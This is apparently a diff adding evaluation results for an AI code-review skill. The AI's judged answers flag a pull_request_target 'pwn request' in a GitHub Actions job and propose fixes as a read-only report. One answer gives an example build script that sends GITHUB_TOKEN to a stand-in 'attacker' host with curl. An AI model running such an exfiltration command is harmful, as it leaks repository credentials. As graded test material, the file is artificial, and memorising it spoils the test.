@@ -1,0 +1,430 @@
+{
+  "schemaVersion": "1.0.0",
+  "skillId": "ci-github-gitlab/ci-pipeline-code-review",
+  "strictness": "high",
+  "trials": 10,
+  "triggerAccuracy": {
+    "truePositive": 6,
+    "falsePositive": 0,
+    "positives": 6,
+    "negatives": 6
+  },
+  "evidence": "authored",
+  "scenarios": [
+    {
+      "id": "trigger-positive-1",
+      "kind": "trigger-positive",
+      "prompt": "Look over this GitHub Actions diff and flag anything risky before we merge it",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-positive-2",
+      "kind": "trigger-positive",
+      "prompt": "Check whether this new .gitlab-ci.yml job could leak our deploy token",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-positive-3",
+      "kind": "trigger-positive",
+      "prompt": "Does this pull_request_target job put our secrets at risk?",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-positive-4",
+      "kind": "trigger-positive",
+      "prompt": "Audit these workflow changes for unpinned third-party actions",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-positive-5",
+      "kind": "trigger-positive",
+      "prompt": "Is the permissions block on this workflow scoped tightly enough?",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-positive-6",
+      "kind": "trigger-positive",
+      "prompt": "Check this CI diff for a place where the PR title gets passed straight into a shell command",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-negative-1",
+      "kind": "trigger-negative",
+      "prompt": "Fix the script injection bug you found in this workflow",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-negative-2",
+      "kind": "trigger-negative",
+      "prompt": "Review this Terraform plan for a publicly exposed S3 bucket",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-negative-3",
+      "kind": "trigger-negative",
+      "prompt": "Review this Node.js diff for a prototype pollution vulnerability",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-negative-4",
+      "kind": "trigger-negative",
+      "prompt": "Give this Python service a general code style review",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-negative-5",
+      "kind": "trigger-negative",
+      "prompt": "Review this Kubernetes Helm chart for missing resource limits",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "trigger-negative-6",
+      "kind": "trigger-negative",
+      "prompt": "Run our standard OWASP Top 10 review on the whole repo",
+      "strictness": "high",
+      "trials": 1,
+      "passes": 1,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "trigger-rank-fork-family",
+      "status": "ran",
+      "deterministic": true
+    },
+    {
+      "id": "pwn-request-review",
+      "kind": "behavior",
+      "prompt": "Review this GitHub Actions diff: a job triggered by pull_request_target checks out github.event.pull_request.head.sha and then runs `npm run build`. What do you find?",
+      "strictness": "high",
+      "trials": 10,
+      "passes": 10,
+      "passRate": 1,
+      "passAtK": 1,
+      "grader": "judge",
+      "status": "ran",
+      "trialRecords": [
+        {
+          "output": "Findings: this is the classic \"pwn request\" pattern — the highest-severity finding this skill exists to catch.\n\n**Detail:**\n- The job is triggered by `pull_request_target`. That trigger runs in the context of the *base* repository and — unlike `pull_request` — is granted a read/write `GITHUB_TOKEN` plus access to repository secrets, even for pull requests from forks.\n- The job then checks out `github.event.pull_request.head.sha`, i.e. the contributor's *own* fork commit (attacker-controlled code), not the base branch.\n- It then executes that code via `npm run build`. `npm run` runs whatever `scripts.build` points to in the *checked-out* `package.json`, so the attacker fully controls which command runs.\n\n**Consequence:** an attacker opens a PR from a fork, edits `package.json` (or any file the build touches — e.g. a preinstall/postinstall hook) so the \"build\" exfiltrates the token/secrets or pushes commits, and the workflow executes it automatically with the privileged context. Because this is exactly the combination of an untrusted checkout plus execution under a privileged trigger, it is a finding regardless of how trivial `npm run build` looks.\n\n**Fix direction (not applied — this review is read-only):**\n1. Preferred: switch the trigger to `pull_request` so the job runs in the fork's limited context with no secrets/write token.\n2. If the privileged context is genuinely required, split it: keep an unprivileged job under `pull_request` that builds/tests the fork code and emits only safe artifacts, and a separate privileged job (no untrusted checkout, no execution of fork code) that consumes those artifacts.\n3. Never check out `pull_request.head.sha` (or `refs/pull/*/merge`) inside a `pull_request_target` job that then runs any command from that checkout.\n\nThe specific risk category is: `pull_request_target` combined with untrusted checkout — reported for every occurrence, independent of how benign the executed step appears.",
+          "outputSha256": "86290adcbc21faa70056c170358033b2d11eaa7616ef3d290b228b2b458ef4dc",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Names pull_request_target + checkout of github.event.pull_request.head.sha + npm run build as the pwn-request pattern (Detail bullets). Explains base-repo secrets and read/write GITHUB_TOKEN reachable from fork code (Consequence). Fix direction given as finding, explicitly 'not applied — this review is read-only': switch to pull_request or split unprivileged/privileged jobs. No edits claimed."
+          },
+          "passed": true
+        },
+        {
+          "output": "**Finding: `pull_request_target` + untrusted-checkout-and-execute (pwn-request pattern).**\n\nThis job is a textbook instance of the highest-severity pattern this review exists to catch. `pull_request_target` runs in the base repository's context — it gets the base repo's secrets and a write-scoped `GITHUB_TOKEN` by default. Checking out `github.event.pull_request.head.sha` pulls in the *contributor's own fork commit*, and then `npm run build` executes code from that commit in the privileged context.\n\nWhy the combination is the finding, not either line alone:\n- `pull_request_target` alone is fine if you never check out untrusted code.\n- Checking out a fork's head alone is fine under plain `pull_request`, which runs without secrets/write scope.\n- Together, a contributor can modify `package.json`'s `build` script (or any file the build touches) to run arbitrary commands with the job's token and any secrets in scope. No \"looks innocuous\" judgment applies — `npm run build` is attacker-controlled the moment it runs against the fork HEAD.\n\n**Fix direction (report only — do not apply):**\n- Switch the job to `pull_request` if it only needs to build/test, so it runs unprivileged with no secrets.\n- Or split it: an unprivileged `pull_request` job builds the fork code and uploads artifacts; a separate `pull_request_target` (or `workflow_run`) job consumes only those vetted artifacts and never executes fork code.\n- If checkout of the PR head is genuinely unavoidable, drop `pull_request_target`, remove all secrets from scope, and set `permissions: {}` on that job — but prefer the split above.\n\n**Additional checks worth running on this diff (not confirmed from what you gave me):**\n- **Script injection:** does any `run:` step interpolate `${{ github.event.pull_request.title }}`, `.body`, or branch name directly into the shell rather than through an `env:` var first? A build step that echoes PR metadata is a common companion bug here.\n- **`permissions:` scope:** is there a workflow- or job-level `permissions:` block? `pull_request_target` with no `permissions:` key inherits write-by-default; it should be scoped tightly (`contents: read`) even after the pwn-request is fixed.\n- **Action pinning:** is `actions/checkout` (and every other third-party `uses:`) pinned to a full commit SHA, or left on a movable tag like `@v4`?\n\nI have not edited anything — this is a report of findings and fix direction only.",
+          "outputSha256": "ab9112e858d4f4e4445dd32cc826f46b2b22025addac29532819d803cc9732ae",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Names the job's own pattern: 'pull_request_target + untrusted-checkout-and-execute (pwn-request pattern)' with head.sha checkout then npm run build. Explains base-repo secrets and write-scoped GITHUB_TOKEN reachable from fork code. Gives fix direction (switch to pull_request, or split unprivileged build + privileged artifact consumer) explicitly as 'report only — do not apply' and states 'I have not edited anything.' No edits claimed."
+          },
+          "passed": true
+        },
+        {
+          "output": "## Finding: pwn-request pattern\n\n**Job triggered by `pull_request_target` checks out `github.event.pull_request.head.sha` and then runs `npm run build`.**\n\nThis is the canonical \"pwn request\" combination, and it must be flagged every time it appears regardless of how trivial the executed step looks:\n\n- **The trigger grants trust.** `pull_request_target` runs in the context of the *base* repository, with that repository's secrets available and a `GITHUB_TOKEN` that (absent a restricting `permissions:` block) can carry write scope.\n- **The checkout pulls untrusted code.** Checking out `github.event.pull_request.head.sha` checks out the contributor's own fork/head commit — code the PR author fully controls.\n- **The build step executes that code.** `npm run build` runs whatever `package.json`'s `build` script says in *that* checkout, plus any lifecycle scripts the toolchain invokes. An attacker opens a PR whose `build` script exfiltrates the token or secrets available in this job's environment.\n\nThe risk is the *combination*, not any single line: `pull_request_target` alone is fine, checking out a fork SHA is fine in an unprivileged `pull_request` job, and `npm run build` is fine on trusted code. Together they let untrusted code run with base-repo privilege.\n\n**Fix direction (report only — do not apply):**\n- Change the trigger to `pull_request` if the job only needs to build/test untrusted code (secrets and write scope won't be present), **or**\n- Split into two jobs: an unprivileged `pull_request` job that builds/tests the fork code and uploads artifacts, and a separate `pull_request_target` job that *only* consumes those artifacts without checking out or executing the fork's ref.\n- Never check out `github.event.pull_request.head.sha` (or the head ref) in a `pull_request_target` job that then runs build/test/lint steps against it.\n\n## Secondary items to verify while you are here\n\nThe diff description does not show these, so they are conditions to confirm rather than confirmed findings:\n\n- **`permissions:` scope** — if this workflow has no `permissions:` key or sets `permissions: write-all` while the job only builds, the exposed token is broader than needed. Scope it down (typically `contents: read`) and grant `id-token`/other write scopes only to the job that needs them.\n- **Action pinning** — check every third-party `uses:` line (e.g. the `actions/checkout` step) for a full commit SHA rather than a movable tag like `@v4`. Pin those to SHAs.\n- **Script injection** — if any `run:`/`script:` step interpolates `${{ github.event.pull_request.title }}`, branch name, or similar untrusted field directly into the shell string, flag it and route it through `env:` instead.\n\nPer this skill, the review is **read-only**: I have reported the finding and fix direction only and have not edited, patched, or applied any change to the workflow.",
+          "outputSha256": "6696db4a23f8e0e04b9aea4183558eef9668d728e54b9516362f07dd71a74ef3",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Answer names the pull_request_target + checkout of github.event.pull_request.head.sha + npm run build combination as the pwn-request pattern (its own job). Explains base-repo secrets and write-scope GITHUB_TOKEN reachable by untrusted fork code. Gives fix direction (switch to pull_request, or split unprivileged build job + privileged artifact-consuming job) as report-only, explicitly stating no edit applied."
+          },
+          "passed": true
+        },
+        {
+          "output": "This is the classic \"pwn request\" pattern, and the diff as described contains a critical finding.\n\n## Finding: `pull_request_target` + untrusted checkout + execute\n\n**Category:** `pull_request_target` combined with untrusted checkout (script execution against attacker-controlled code).\n\n**The specific problem:** The job runs under `pull_request_target`, which grants the elevated token/secret context of the base repository. It then checks out `github.event.pull_request.head.sha` — the head SHA of the contributor's *own fork/branch*, i.e. code the PR author fully controls. It then executes `npm run build` against that checkout.\n\n**Concrete consequence:** `pull_request_target` deliberately runs with a read/write `GITHUB_TOKEN` and access to repository secrets, precisely because it is meant to run in the *trusted base* context without checking out untrusted code. By checking out the fork's head SHA, you hand the attacker's code that trusted context. `npm run build` executes whatever `package.json` `scripts.build` contains — and since the attacker controls the checked-out tree, they control `package.json`. So the step is remote code execution in a privileged context: the attacker can exfiltrate `GITHUB_TOKEN`, any injected secrets, and (if granted) OIDC tokens, and can push to the repo with the write-scoped token depending on what the job does next or what's available.\n\nNote this is true **regardless of how innocuous `npm run build` looks** — the risk is the combination of `pull_request_target` + checkout of untrusted head + any execute step, not the specific command. The command is simply the delivery mechanism.\n\n**Fix direction (to report, not apply):**\n- If the build only needs to test the PR's code, switch the trigger to `pull_request` — that runs in the fork's own restricted context with a read-only token and no secrets.\n- If a privileged `pull_request_target` context is genuinely required (e.g. posting a comment), split the workflow: an unprivileged `pull_request` job builds/tests and uploads *artifacts*, and a separate privileged job consumes only those safe artifacts — never a checkout of the head SHA followed by execution.\n\n## Additional checks I would run before calling the review complete\n\nBecause the diff touches job structure, several adjacent risks are also in scope and I would verify them rather than assume:\n\n- **Action pinning:** every third-party `uses:` line (e.g. `actions/checkout@v4`) referenced by a mutable tag rather than a full commit SHA is a separate finding. A tag comment beside a SHA is fine; a bare tag as the actual pin is not.\n- **`permissions:` scope:** a workflow-level `permissions: write-all`, or no `permissions:` key at all, on a workflow whose jobs don't all need write access, is a finding. Check whether `id-token: write` is scoped only to a job that actually does OIDC federation.\n- **Script injection:** any `run:`/`script:` step interpolating `${{ github.event.* }}` (PR title, branch name, commit message, issue body) directly into the shell string — instead of routing it through an intermediate `env:` entry — is a finding, distinct from the pwn-request issue above.\n- **Secrets:** check whether the checkout-then-build job, or any job in this workflow, is also given access to deploy secrets; that escalates the pwn-request finding from \"token exfiltration\" to \"secret exfiltration.\"\n\n## Report format\n\n```\nFindings in <workflow file>:\n  - Job \"<name>\" (line N): triggered by pull_request_target, checks out\n    github.event.pull_request.head.sha (attacker-controlled fork head),\n    then runs `npm run build` against it -- pwn-request pattern / RCE in\n    privileged context. Fix direction: use `pull_request`, or split into\n    an unprivileged build job + a separate privileged job consuming only\n    safe artifacts.\n  - [other findings as applicable: tag-pinned actions, missing/over-broad\n    permissions, direct github.event.* interpolation.]\n```\n\n**Per this skill's constraints, this is read-only:** I am reporting the finding and the fix direction only. I have not edited the workflow, and I make no claim that any fix — even a partial or proof-of-concept one — was applied. Applying the change belongs to an implementation pass or the author. I also have no file access in this exercise, so the review is based solely on the diff behavior you described; I could not independently confirm surrounding lines such as the `permissions:` block or the exact `uses:` pins, and those should be checked before the review is considered fully verified.",
+          "outputSha256": "a4db2ee5f282de8bf13d027b11f10f0ea3c2fd52c2ef0b6c723c966cfc2877d8",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Answer names the pwn-request pattern: pull_request_target + checkout of github.event.pull_request.head.sha + npm run build (the diff's job). Explains concrete risk: read/write GITHUB_TOKEN, base-repo secrets, OIDC, RCE in privileged context from untrusted fork code. Gives fix direction as finding only (switch to pull_request, or split unprivileged build + privileged artifact-consuming job), and explicitly states read-only, no edits applied."
+          },
+          "passed": true
+        },
+        {
+          "output": "**Finding: pwn-request pattern (pull_request_target + untrusted checkout-and-execute).**\n\nThe job is trigger-scoped by `pull_request_target`. That trigger runs in the base repository's context, so the job receives the base repo's secrets, the base repo's `GITHUB_TOKEN`, and whatever `permissions:` scope the workflow grants — precisely because GitHub intends `pull_request_target` as the \"I trust this enough to run with privileged context\" trigger.\n\nAgainst that privileged context, the job then does two things that combine into the finding:\n\n1. It checks out `github.event.pull_request.head.sha` — the *contributor's own* code, from their fork, at the exact commit they pushed. This is attacker-controlled content.\n2. It executes that content with `npm run build`.\n\nThat combination is the classic \"pwn request\": any PR author can put arbitrary commands in the `build` script in their fork's `package.json` (e.g. `\"build\": \"curl -sSf https://attacker/$(cat $GITHUB_TOKEN)\"` or exfiltrate any secret exposed to the job). Because `pull_request_target` hands the job privileged credentials, the attacker's code runs with those credentials. Checkout alone is not the danger and running `npm run build` alone is not the danger — the danger is the *pairing* of an untrusted checkout with a privileged trigger and then executing.\n\nPer the review rules, this is flagged every time it appears regardless of how innocuous `npm run build` looks — the risk is the combination, not the apparent triviality of the command.\n\n**Fix direction (report only — not applied):**\n- If the job needs no secrets and no write scope: switch the trigger to plain `pull_request`. It then runs in the fork's context with no secrets, which is the safe default for building contributor code.\n- If you genuinely need privileged post-processing of PR content, split into two jobs: an **unprivileged** `pull_request` job that checks out and builds the fork code (no secrets, `permissions: {}` or `contents: read`), producing a safe artifact; and a separate **privileged** job (e.g. `workflow_run` or a label-gated `pull_request_target`) that consumes only the artifact and never executes contributor code.\n- Do not simply leave the untrusted checkout in place and rely on the build script \"looking safe\" — the contributor controls that script.\n\n**Other checks I cannot clear from the information given** (state these explicitly rather than assuming them safe):\n- The third-party `uses:` lines (including `actions/checkout@…`) — pinned to a full commit SHA, or a mutable tag?\n- The `permissions:` block — is the workflow/job scoped to least privilege, or `write-all`/absent?\n- Whether `run:` interpolates any `${{ github.event.* }}` (PR title, branch name, etc.) straight into the shell, rather than passing it through `env:` first.\n\nThose are separate findings categories and depend on the omitted lines; the `pull_request_target` + head-SHA checkout + execute combination above is the finding that stands on its own from what was described.",
+          "outputSha256": "486e691d558228f9e58f7bf3bb371de9babdd77114fabc0b84b60e4fac3a2919",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Names pull_request_target + checkout of github.event.pull_request.head.sha + npm run build as the pwn-request pattern (\"classic 'pwn request'\"). Explains base-repo secrets/GITHUB_TOKEN reachable from untrusted fork code. Gives fix direction as report only (\"not applied\"): switch to pull_request, or split unprivileged build + privileged artifact-consuming job. No edits claimed."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings in the changed workflow:\n\n- **Job (trigger: `pull_request_target`) — pwn-request pattern.** This job is triggered by `pull_request_target`, which runs with a privileged token and access to repository secrets, but it checks out `github.event.pull_request.head.sha` — the contributor's own fork commit — and then executes code from that checkout via `npm run build`. This is the classic \"pwn request\": the untrusted PR head is fetched *and then executed* in a privileged context. Note the risk is the **combination** (privileged trigger + untrusted checkout + execution), not any single line — `pull_request_target` alone is fine, and checking out a fork head in an unprivileged `pull_request` job is fine, but together they hand repo secrets / a write-scoped `GITHUB_TOKEN` to arbitrary contributor-controlled code. `npm run build` is especially dangerous because it runs `package.json`'s `scripts.build` (and any install/lifecycle hooks), all of which the PR author controls. Fix direction: switch the trigger to `pull_request` for this job, or split it — an unprivileged job builds from the fork head and uploads artifacts, and a separate `pull_request_target` job consumes only those vetted artifacts without ever executing fork code.\n\n- **`actions/checkout` ref / action pinning (secondary).** Confirm how the checkout step references the fork SHA. If `actions/checkout` (or any third-party action here) is pinned to a mutable tag like `@v4` rather than a full commit SHA, that is a separate pinning finding. Even with a correct pin, it does not remove the pwn-request finding above — the pin only fixes the action supply chain, not the untrusted-checkout-plus-execute problem.\n\n- **`permissions:` scope.** Check whether this workflow sets a least-privilege `permissions:` block. If it is missing or set to `write-all` on a `pull_request_target` workflow that executes contributor code, that widens the blast radius (write-scoped `GITHUB_TOKEN`, `id-token: write` for OIDC). Fix direction: scope `permissions:` to the minimum, and grant `id-token: write` only to the specific job needing federation.\n\n- **Script injection (secondary).** Scan every `run:`/`script:` step for `${{ github.event.* }}` fields (PR title, body, branch name, commit message) interpolated directly into the shell string. If any step does that, route the value through an intermediate `env:` entry first. Not confirmed from the excerpt shown, but it should be checked since this job already handles untrusted PR data.\n\nPer this skill's scope: the review is read-only — I am reporting findings and fix direction only, and have not edited the workflow. Do not claim any fix has been applied.\n\nVerification checklist status: trigger × untrusted-checkout-and-execute pattern → checked (fired). Third-party `uses:` pinning → flagged as needing confirmation of full commit SHA. `permissions:` block → flagged for least-privilege check. `run:`/`script:` interpolation of `${{ github.event.* }}` → flagged as needing a scan.",
+          "outputSha256": "000bce5c27ecc1a80251d75773900ea75118f01514569ed4dc6bb02bae47bab9",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Answer names the job triggered by pull_request_target that checks out github.event.pull_request.head.sha and runs npm run build as the pwn-request pattern (criterion 1). It explains the concrete risk: privileged token/secrets and write-scoped GITHUB_TOKEN handed to contributor-controlled fork code (criterion 2). It gives fix direction as a finding only — switch trigger to pull_request or split into unprivileged build job plus separate job consuming vetted artifacts — and explicitly states it is read-only and has not edited the workflow (criterion 3, no fail criterion)."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings in the changed workflow file (job triggered by `pull_request_target`):\n\n- **Job (checkout step): `pull_request_target` + untrusted checkout + execute — pwn-request pattern.** The job is triggered by `pull_request_target`, checks out `github.event.pull_request.head.sha` (the contributor's own fork/head commit), and then runs a build step (`npm run build`) against that checkout. This is the exact \"pwn request\" combination flagged in `rules/security.mdc`: `pull_request_target` runs in the context of the base repository with access to its secrets and a write-scoped `GITHUB_TOKEN`, while the code being executed (`npm run build`, plus any lifecycle/config scripts it pulls in — `package.json` scripts, a changed `postinstall`, a swapped `Makefile` target, etc.) is attacker-controlled. The consequence is that an outside contributor can execute arbitrary code with the base repo's token/secret privileges simply by opening a PR. Flag this every time, regardless of how innocuous `npm run build` looks, because the risk is the trigger/checkout/execute combination, not any single line. Fix direction: either switch the trigger to `pull_request` (which runs with a read-only token and no secrets), or split into two jobs — an unprivileged `pull_request`-triggered job that builds the untrusted code and uploads artifacts, and a separate `pull_request_target` (or `workflow_run`) privileged job that only consumes those already-built, verified artifacts and never checks out or executes the fork's code. Do not attempt the fix here; this review is read-only.\n\nAdditional checks I would confirm against the rest of the diff before closing (none of these can be cleared from the snippet alone):\n\n- **Action pinning:** confirm every third-party `uses:` line (e.g. `actions/checkout@...`) is pinned to a full commit SHA, not a movable tag like `@v4`. A bare tag is a separate finding.\n- **`permissions:` least privilege:** check the workflow- and job-level `permissions:` blocks. If this job is granted `contents: write`, `id-token: write`, or the workflow has `permissions: write-all` (or no `permissions:` at all) while a job handling untrusted PR code, that is a finding — untrusted code should never run with write scope or OIDC access.\n- **Script injection:** if any `run:`/`script:` step in this or a sibling job interpolates `${{ github.event.pull_request.title }}` (or another `github.event.*` field, branch name, commit message) directly into the shell string, that is a script-injection finding — the value must be routed through an `env:` entry first, not spliced inline.\n- **Secrets:** confirm no deploy secret or credential-bearing secret is exposed to this `pull_request_target` job; secrets reachable by a job that checks out and runs fork code are effectively attacker-readable.\n\nNo fix was applied; the above is report + fix direction only.",
+          "outputSha256": "c47d72f3e53e67c13989e8602875ae15c89951ead2200d1862a7239d70201bb6",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Answer names the job's pull_request_target trigger + checkout of github.event.pull_request.head.sha + npm run build as the pwn-request pattern (first bullet). Explains base-repo secrets and write-scoped GITHUB_TOKEN reachable by attacker-controlled fork code. Gives fix direction (switch to pull_request, or split unprivileged build + privileged artifact-consuming job) as a finding, and explicitly states no fix applied, review is read-only."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings in the changed workflow:\n\n1. **`pull_request_target` + untrusted checkout-and-execute — pwn-request pattern.**\n   The job is triggered by `pull_request_target`, which runs with the base repository's privileges and secret access, but it checks out `github.event.pull_request.head.sha` — the contributor's own fork commit — and then executes `npm run build` against that checkout. This is the classic \"pwn request\": the `pull_request_target` context grants the job write-scoped `GITHUB_TOKEN` (and any repository secrets), while the code being built/run comes from an untrusted fork. A contributor can put arbitrary code into the fork's `package.json` `build` script (or any file `npm run build` transitively executes, e.g. a pre/post-install or lifecycle hook) and have it run in the privileged context, exfiltrating the token/secrets or pushing to the repo.\n\n   **Fix direction:** do not combine `pull_request_target` with executing the fork's code.\n   - Switch the trigger to `pull_request` if the job only needs to build/test untrusted code (that context is unprivileged and read-only for forks by default), or\n   - Split into two jobs: an unprivileged build (under `pull_request`) that produces artifacts, plus a separate privileged job (under `pull_request_target`) that only consumes those pre-built, already-validated artifacts — never re-running the fork's scripts itself — and only if a maintained trust gate (e.g. `pull_request_target` label check / trusted-authors filter) permits it.\n\n2. **`npm run build` executes fork-controlled scripts.**\n   Even outside the sensitive-context question, the specific command is a red flag because `npm run <script>` runs whatever the checked-out `package.json` defines, so it is code execution, not a passive read. This is what makes the combination in finding 1 exploitable rather than theoretical.\n\n3. **Action pinning, `permissions:`, and script injection — not determinable from the excerpt.**\n   The diff as described shows only the trigger, the `head.sha` checkout, and the `npm run build` line. I cannot confirm from this whether:\n   - the checkout / setup actions are pinned to a full commit SHA or a mutable tag,\n   - the workflow or job sets a least-privilege `permissions:` block (a `pull_request_target` job with an unset/`write-all` permissions block widens finding 1's blast radius), or\n   - any `${{ github.event.* }}` value is interpolated straight into a `run:` string.\n   These should be checked in the full job before signing off, but they are secondary to finding 1, which is a definite, exploitable issue on its own.\n\n**Summary:** the single listed change is a high-severity pwn-request vulnerability. Report it as a blocking finding with the split-job / `pull_request` fix direction; do not apply any fix here — this review is read-only.",
+          "outputSha256": "784c730ca2bb10a5891f47f6a96b298be1b50b2b5b607d3cb6f2b1b063762a86",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Finding 1 names pull_request_target + checkout of github.event.pull_request.head.sha + npm run build as the pwn-request pattern for this job. It explains base-repo secrets and write-scoped GITHUB_TOKEN reachable from untrusted fork code. Fix direction given as finding only (switch to pull_request, or split unprivileged build + privileged artifact-consuming job). Explicitly read-only: 'do not apply any fix here'."
+          },
+          "passed": true
+        },
+        {
+          "output": "Findings in the diff (`.github/workflows/*.yml`), scoped to the job as described:\n\n- **Job (checks out `github.event.pull_request.head.sha`, then runs `npm run build`): pwn-request pattern.** The job is triggered by `pull_request_target`, which runs in the context of the base repository and therefore has access to its secrets and (by default) a token with write scope — but it checks out the contributor's own fork head SHA and then executes code (`npm run build`) against that checkout. That `build` script comes from the untrusted fork, so a malicious PR can put arbitrary commands in `package.json`'s `build` (or any install/build hook, e.g. a `postinstall` or a config file the build reads) and have them run with the base repo's privileges, secrets, and write token. This is a finding regardless of how innocuous `npm run build` looks, because the risk is the trigger-plus-untrusted-checkout-plus-execute combination, not any single line. Fix direction: switch the trigger to `pull_request` (which runs without base-repo secrets/write scope), or split the pipeline into an unprivileged build job that runs on `pull_request` and a separate privileged job that consumes only safe artifacts (and never checks out the fork head under the privileged trigger).\n\n- **Dependent/unverified in this diff:** because I only have the fragment described (trigger, checkout of the fork head SHA, `npm run build`), I could not confirm the surrounding lines. Flag as **unverified, not cleared**: (a) the exact form of the `uses: actions/checkout@...` pin — if it is pinned to a tag rather than a full commit SHA, that is a separate pinning finding; (b) the presence/scope of any `permissions:` block — absent or `write-all` alongside a job that does not need write access is a least-privilege finding, and `id-token: write` should be scoped only to a job that actually does OIDC; (c) whether the checkout uses `persist-credentials: true` (default) — under `pull_request_target` that hands the fork's code a live token, hardening the finding; (d) whether any `run:` step interpolates untrusted `github.event.*` fields directly, which would be an additional injection finding.\n\nNo fix was applied — this review is read-only; the fix direction above belongs to the author or the implementation skill.",
+          "outputSha256": "ff96ccd142acc9969ba9a6406adcefc2cd3af331bb998f120701625f64db73c4",
+          "promptSha256": "466f21c826cf2b5fb1b06e933913f0f7a736c69c9a2dc644c13c07454ecf9e25",
+          "deterministic": [],
+          "judge": {
+            "verdict": "pass",
+            "reason": "Answer names the job's pull_request_target trigger plus checkout of github.event.pull_request.head.sha and npm run build as the pwn-request pattern (first bullet). It explains base-repo secrets and write-scope token reachable by untrusted fork code. It gives fix direction (switch to pull_request, or split unprivileged build + privileged artifact-consuming job) as a finding, and explicitly states no fix was applied (read-only)."
+          },
+          "passed": true
+        },
+        {
+          "output": "**Finding: pwn-request pattern — `pull_request_target` + untrusted checkout and execute.**\n\n**Where:** the job in the diff, specifically the two combined elements:\n- Trigger: `pull_request_target`\n- A checkout step referencing the pull request's own head: `github.event.pull_request.head.sha` (or equivalently `github.event.pull_request.head.ref`)\n- Followed by `npm run build` executed against that checkout\n\n**Risk category:** `pull_request_target` combined with untrusted checkout (the highest-severity category for this trigger).\n\n**Why this is a finding regardless of how innocuous `npm run build` looks:**\n`pull_request_target` runs with the *base repository's* privileges — access to repository secrets, a write-scoped `GITHUB_TOKEN`, and potentially `id-token: write` for OIDC federation. Checking out and executing code from `github.event.pull_request.head.sha` means the job runs **attacker-controlled code** with those base-repo privileges. This is not limited to what `npm run build` \"obviously\" does:\n- `npm run build` resolves `build` from the contributor's own `package.json` (and scripts it invokes, plus pre/post hooks like `prebuild`), so the executed command is fully attacker-controlled.\n- Even a genuinely harmless build can be subverted via a malicious `postinstall`/`prepare` script triggered by dependency installation, or a modified build config.\n- The attacker's code therefore runs with access to the repo's secrets and a write token — the contributor fork needs no special access to achieve this.\n\nPer the skill's rules, this combination is flagged **every time it appears**, independent of the executed step.\n\n**Fix direction (report only — do not apply):**\n- Preferred: change the trigger to plain `pull_request` (unprivileged; the token is read-only and fork secrets are not exposed).\n- If base-repo context is genuinely required, split into two jobs: (1) an unprivileged `pull_request`-triggered job that builds/tests the fork's code and uploads only safe artifacts (never a shell/script artifact the privileged job will execute), and 